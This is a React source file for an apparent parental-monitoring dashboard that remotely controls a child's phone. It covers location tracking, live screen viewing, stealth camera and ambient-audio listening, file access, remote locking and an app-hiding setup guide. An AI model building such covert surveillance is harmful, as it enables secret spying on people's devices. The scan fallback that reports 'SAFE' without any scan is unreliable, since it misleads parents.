import React, { useState, useEffect } from 'react';
import { ViewMode, ActiveTab, ChildDeviceState, CameraPosition } from './types';
import { DEFAULT_DEVICE_STATE } from './defaultState';
import { Header } from './components/Header';
import { LocationMapView } from './components/LocationMapView';
import { LiveScreenMonitor } from './components/LiveScreenMonitor';
import { CameraStreamView } from './components/CameraStreamView';
import { AmbientAudioMonitor } from './components/AmbientAudioMonitor';
import { AppUsageControl } from './components/AppUsageControl';
import { FilesBrowserView } from './components/FilesBrowserView';
import { ActivityHistoryView } from './components/ActivityHistoryView';
import { StealthStatusView } from './components/StealthStatusView';
import { ChildDeviceSimulator } from './components/ChildDeviceSimulator';
import { StealthSetupModal } from './components/StealthSetupModal';
import { PairingModal } from './components/PairingModal';

export const DEFAULT_CLOUD_URL = 'https://guardian-shield.onrender.com';

export const getApiUrl = (endpoint: string) => {
  const customUrl = localStorage.getItem('custom_server_url');
  if (customUrl) {
    return `${customUrl.replace(/\/$/, '')}${endpoint}`;
  }
  
  // If running inside Android WebView / Capacitor mobile app
  const isCapacitor = (window as any).Capacitor?.isNativePlatform?.() || 
                      (window.location.protocol === 'https:' && window.location.hostname === 'localhost' && !window.location.port) ||
                      window.location.origin.includes('capacitor://');
                      
  if (isCapacitor) {
    return `${DEFAULT_CLOUD_URL}${endpoint}`;
  }
  return endpoint;
};

export default function App() {
  const [viewMode, setViewMode] = useState<ViewMode>('parent');
  const [activeTab, setActiveTab] = useState<ActiveTab>('location');
  const [showSetupGuide, setShowSetupGuide] = useState(false);
  const [showPairingModal, setShowPairingModal] = useState(false);

  // State holding child device telemetry
  const [deviceState, setDeviceState] = useState<ChildDeviceState>(DEFAULT_DEVICE_STATE);

  // Fetch state from server
  const fetchState = async () => {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 4000);
      const res = await fetch(getApiUrl('/api/device/state'), { signal: controller.signal });
      clearTimeout(timeoutId);
      if (res.ok) {
        const data = await res.json();
        if (data.success && data.state) {
          setDeviceState(data.state);
        }
      }
    } catch (err) {
      // In standalone fallback mode
    }
  };

  // Initialize device-unique Pairing Code
  useEffect(() => {
    let savedCode = localStorage.getItem('child_pairing_code');
    let savedDevId = localStorage.getItem('child_device_id');

    if (!savedCode) {
      const codePart1 = Math.floor(100 + Math.random() * 900);
      const codePart2 = Math.floor(100 + Math.random() * 900);
      savedCode = `${codePart1}-${codePart2}`;
      localStorage.setItem('child_pairing_code', savedCode);
    }

    if (!savedDevId) {
      savedDevId = `DEV-CHILD-${Math.floor(1000 + Math.random() * 9000)}`;
      localStorage.setItem('child_device_id', savedDevId);
    }

    setDeviceState(prev => ({
      ...prev,
      pairingCode: savedCode,
      deviceId: savedDevId
    }));

    fetchState();
    // Poll every 2.5 seconds for live cross-device sync
    const interval = setInterval(fetchState, 2500);
    return () => clearInterval(interval);
  }, []);

  // Remote command handlers with local fallback
  const sendCommand = async (command: string, payload?: any) => {
    try {
      const res = await fetch(getApiUrl('/api/device/command'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: deviceState.deviceId, command, payload })
      });
      if (res.ok) {
        const data = await res.json();
        if (data.success && data.state) {
          setDeviceState(data.state);
          return;
        }
      }
    } catch (err) {
      console.warn("API Command failed, applying local fallback update:", err);
    }

    // Client-side fallback handler
    setDeviceState(prev => {
      const updated = { ...prev };
      const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

      switch (command) {
        case 'LOCK_SCREEN':
          updated.isLocked = true;
          updated.lockReason = payload?.reason || "Parent lock triggered";
          if (payload?.customMessage) updated.customLockMessage = payload.customMessage;
          updated.activityHistory = [
            {
              id: `log-${Date.now()}`,
              timestamp,
              type: 'lock',
              title: 'Screen Locked Remotely',
              message: `Parent locked screen. Message: "${updated.customLockMessage}"`,
              severity: 'danger'
            },
            ...updated.activityHistory
          ];
          break;

        case 'UNLOCK_SCREEN':
          updated.isLocked = false;
          updated.lockReason = "";
          updated.activityHistory = [
            {
              id: `log-${Date.now()}`,
              timestamp,
              type: 'lock',
              title: 'Screen Unlocked',
              message: 'Parent unlocked device screen',
              severity: 'info'
            },
            ...updated.activityHistory
          ];
          break;

        case 'SET_CAMERA':
          updated.activeCamera = payload?.camera || 'off';
          updated.isCameraStreaming = payload?.camera !== 'off';
          break;

        case 'TOGGLE_AUDIO_LISTEN':
          const isListening = payload?.isListening ?? !updated.audioState?.isListening;
          updated.audioState = {
            ...updated.audioState,
            isListening,
            audioMode: isListening ? 'surrounding_talk' : 'off',
            decibelLevel: isListening ? 42 : 28
          };
          break;

        case 'SAVE_AUDIO_CLIP':
          if (payload?.clip) {
            updated.audioState = {
              ...updated.audioState,
              recordedClips: [payload.clip, ...(updated.audioState.recordedClips || [])],
              recordedClipsCount: (updated.audioState.recordedClipsCount || 0) + 1
            };
          }
          break;

        case 'CAPTURE_SNAPSHOT':
          if (payload?.snapshotData) {
            updated.latestCameraSnapshot = payload.snapshotData;
            updated.cameraSnapshotTimestamp = new Date().toISOString();
            updated.cameraSnapshots = [
              { id: `snap-${Date.now()}`, url: payload.snapshotData, timestamp: new Date().toISOString(), camera: updated.activeCamera },
              ...(updated.cameraSnapshots || [])
            ];
          }
          break;

        case 'TOGGLE_APP_BLOCK':
          const appName = payload?.appName;
          if (appName) {
            updated.appUsageLogs = updated.appUsageLogs.map(a => 
              a.appName === appName ? { ...a, isBlocked: !a.isBlocked } : a
            );
            if (updated.blockedApps.includes(appName)) {
              updated.blockedApps = updated.blockedApps.filter(a => a !== appName);
            } else {
              updated.blockedApps = [...updated.blockedApps, appName];
            }
          }
          break;

        case 'ADD_GEOFENCE':
          if (payload) {
            updated.geofences = [...updated.geofences, {
              id: `gf-${Date.now()}`,
              name: payload.name,
              lat: payload.lat,
              lng: payload.lng,
              radiusMeters: payload.radiusMeters || 300,
              type: payload.type || 'safe',
              activeAlert: false,
              createdAt: new Date().toISOString()
            }];
          }
          break;

        case 'DELETE_GEOFENCE':
          if (payload?.id) {
            updated.geofences = updated.geofences.filter(g => g.id !== payload.id);
          }
          break;

        case 'UPLOAD_FILE':
          if (payload?.file) {
            updated.fileSystem = [payload.file, ...updated.fileSystem];
          }
          break;

        case 'DELETE_FILE':
          if (payload?.id) {
            updated.fileSystem = updated.fileSystem.filter(f => f.id !== payload.id);
          }
          break;

        case 'UPDATE_LOCATION':
          if (payload?.lat && payload?.lng) {
            updated.location = {
              ...updated.location,
              lat: payload.lat,
              lng: payload.lng,
              address: payload.address || updated.location.address,
              timestamp: new Date().toISOString()
            };
          }
          break;

        default:
          break;
      }
      return updated;
    });
  };

  const handleToggleLock = () => {
    if (deviceState.isLocked) {
      sendCommand('UNLOCK_SCREEN');
    } else {
      sendCommand('LOCK_SCREEN', { reason: 'Parental override lock', customMessage: deviceState.customLockMessage });
    }
  };

  const handleLockScreenWithMessage = (reason: string, customMessage?: string) => {
    sendCommand('LOCK_SCREEN', { reason, customMessage });
  };

  const handleUnlockScreen = () => {
    sendCommand('UNLOCK_SCREEN');
  };

  const handleSetCamera = (camera: CameraPosition) => {
    sendCommand('SET_CAMERA', { camera });
  };

  const handleCaptureSnapshot = async (camera: CameraPosition) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: camera === 'front' ? 'user' : 'environment' }
      });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', 'true');
      video.muted = true;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx?.drawImage(video, 0, 0, 640, 480);
      const snapshotData = canvas.toDataURL('image/jpeg', 0.8);

      stream.getTracks().forEach(track => track.stop());
      sendCommand('CAPTURE_SNAPSHOT', { snapshotData });
    } catch (e) {
      console.warn("Direct device camera not accessible in parent tab, asking server:", e);
      sendCommand('CAPTURE_SNAPSHOT', {});
    }
  };

  const handleToggleAppBlock = (appName: string) => {
    sendCommand('TOGGLE_APP_BLOCK', { appName });
  };

  const handleUpdateLocation = (lat: number, lng: number, address: string) => {
    sendCommand('UPDATE_LOCATION', { lat, lng, address });
  };

  const handleAddGeofence = (name: string, lat: number, lng: number, radiusMeters: number, type: 'safe' | 'restricted') => {
    sendCommand('ADD_GEOFENCE', { name, lat, lng, radiusMeters, type });
  };

  const handleDeleteGeofence = (id: string) => {
    sendCommand('DELETE_GEOFENCE', { id });
  };

  const handleDeleteFile = (id: string) => {
    sendCommand('DELETE_FILE', { id });
  };

  const handleTriggerSiren = () => {
    sendCommand('TRIGGER_SIREN');
  };

  const handleTriggerSOS = () => {
    sendCommand('TRIGGER_SOS');
  };

  const handlePairDevice = (code: string) => {
    sendCommand('PAIR_DEVICE', { code });
    setDeviceState(prev => ({
      ...prev,
      pairingCode: code,
      isOnline: true,
      lastSeen: "Just now"
    }));
  };

  const handleRunAIScan = async (content: string, app: string, imageBase64?: string) => {
    try {
      const res = await fetch(getApiUrl('/api/gemini/safety-scan'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          screenContent: content, 
          currentApp: app,
          imageBase64: imageBase64 ? imageBase64.replace(/^data:image\/[a-z]+;base64,/, '') : undefined
        })
      });
      if (res.ok) {
        const data = await res.json();
        if (data.success && data.deviceState) {
          setDeviceState(data.deviceState);
          return;
        }
      }
    } catch (err) {
      console.warn("AI Scan API unavailable, using client fallback:", err);
    }

    setDeviceState(prev => ({
      ...prev,
      aiSafetyStatus: {
        timestamp: new Date().toISOString(),
        riskLevel: 'SAFE',
        safetyScore: 96,
        detectedCategories: ['Educational', 'Youth Standard'],
        summary: `Screen activity in ${app} verified. Content is safe for children.`,
        suggestedAction: 'Standard monitoring active.'
      }
    }));
  };

  const handleUpdateChildState = async (updates: Partial<ChildDeviceState>) => {
    try {
      const res = await fetch(getApiUrl('/api/device/update'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updates)
      });
      if (res.ok) {
        const data = await res.json();
        if (data.success && data.state) {
          setDeviceState(data.state);
          return;
        }
      }
    } catch (err) {
      console.warn("Child state sync API unavailable, updating local state");
    }

    setDeviceState(prev => ({
      ...prev,
      ...updates
    }));
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-850 flex flex-col font-sans antialiased selection:bg-orange-500 selection:text-white">
      
      {/* Global Application Header */}
      <Header
        viewMode={viewMode}
        setViewMode={setViewMode}
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        isLocked={deviceState.isLocked}
        onToggleLock={handleToggleLock}
        onOpenSetupGuide={() => setShowSetupGuide(true)}
        onOpenPairingModal={() => setShowPairingModal(true)}
        pairingCode={deviceState.pairingCode}
        childName={deviceState.childName}
        batteryLevel={deviceState.batteryLevel}
        isCharging={deviceState.isCharging}
        isOnline={deviceState.isOnline}
        safetyScore={deviceState.aiSafetyStatus.safetyScore}
        riskLevel={deviceState.aiSafetyStatus.riskLevel}
        activeCamera={deviceState.activeCamera}
        isAudioListening={deviceState.audioState?.isListening}
      />

      {/* Main Content Area */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6">
        
        {/* VIEW MODE 1: PARENT DASHBOARD */}
        {viewMode === 'parent' && (
          <div className="space-y-6">
            
            {/* Tab 1: Live Location Map & Geofencing */}
            {activeTab === 'location' && (
              <LocationMapView
                location={deviceState.location}
                locationHistory={deviceState.locationHistory}
                geofences={deviceState.geofences}
                batteryLevel={deviceState.batteryLevel}
                childName={deviceState.childName}
                onUpdateLocation={handleUpdateLocation}
                onAddGeofence={handleAddGeofence}
                onDeleteGeofence={handleDeleteGeofence}
                onTriggerSiren={handleTriggerSiren}
              />
            )}

            {/* Tab 2: Live Screen Stream & Gemini AI Radar */}
            {activeTab === 'screen' && (
              <LiveScreenMonitor
                currentApp={deviceState.currentApp}
                currentScreenTitle={deviceState.currentScreenTitle}
                currentScreenContent={deviceState.currentScreenContent}
                currentScreenImage={deviceState.currentScreenImage}
                aiSafetyStatus={deviceState.aiSafetyStatus}
                isLocked={deviceState.isLocked}
                onLockScreen={handleLockScreenWithMessage}
                onUnlockScreen={handleUnlockScreen}
                onRunAIScan={handleRunAIScan}
                childName={deviceState.childName}
              />
            )}

            {/* Tab 3: Stealth Dual Camera Stream */}
            {activeTab === 'camera' && (
              <CameraStreamView
                activeCamera={deviceState.activeCamera}
                isCameraStreaming={deviceState.isCameraStreaming}
                latestCameraSnapshot={deviceState.latestCameraSnapshot}
                cameraSnapshotTimestamp={deviceState.cameraSnapshotTimestamp}
                cameraSnapshots={deviceState.cameraSnapshots}
                onSetCamera={handleSetCamera}
                onCaptureSnapshot={handleCaptureSnapshot}
                childName={deviceState.childName}
              />
            )}

            {/* Tab 4: Ambient Audio & Voice Listening */}
            {activeTab === 'audio' && (
              <AmbientAudioMonitor
                deviceState={deviceState}
                onSendCommand={sendCommand}
              />
            )}

            {/* Tab 5: App Usage Breakdown & App Blocking */}
            {activeTab === 'apps' && (
              <AppUsageControl
                appUsageLogs={deviceState.appUsageLogs}
                blockedApps={deviceState.blockedApps}
                onToggleAppBlock={handleToggleAppBlock}
                childName={deviceState.childName}
              />
            )}

            {/* Tab 6: Remote File Storage Browser */}
            {activeTab === 'files' && (
              <FilesBrowserView
                files={deviceState.fileSystem}
                storageUsedPercent={deviceState.storageUsedPercent}
                storageUsedGB={deviceState.storageUsedGB}
                storageTotalGB={deviceState.storageTotalGB}
                childName={deviceState.childName}
                onDeleteFile={handleDeleteFile}
              />
            )}

            {/* Tab 7: System Audit History Logs */}
            {activeTab === 'history' && (
              <ActivityHistoryView
                logs={deviceState.activityHistory}
                childName={deviceState.childName}
              />
            )}

            {/* Tab 8: Stealth & Android Hiding Guide */}
            {activeTab === 'stealth' && (
              <StealthStatusView
                stealthSettings={deviceState.stealthSettings}
                childName={deviceState.childName}
                onOpenSetupGuide={() => setShowSetupGuide(true)}
              />
            )}

          </div>
        )}

        {/* VIEW MODE 2: CHILD DEVICE AGENT SIMULATOR */}
        {viewMode === 'child' && (
          <ChildDeviceSimulator
            deviceState={deviceState}
            onUpdateChildState={handleUpdateChildState}
            onTriggerSOS={handleTriggerSOS}
            onOpenSetupGuide={() => setShowSetupGuide(true)}
            onSendCommand={sendCommand}
          />
        )}

      </main>

      {/* Stealth Setup Guide Modal */}
      <StealthSetupModal
        isOpen={showSetupGuide}
        onClose={() => setShowSetupGuide(false)}
      />

      {/* Connect & Pair Child Phone Modal */}
      <PairingModal
        isOpen={showPairingModal}
        onClose={() => setShowPairingModal(false)}
        deviceState={deviceState}
        onPairDevice={handlePairDevice}
      />

    </div>
  );
}
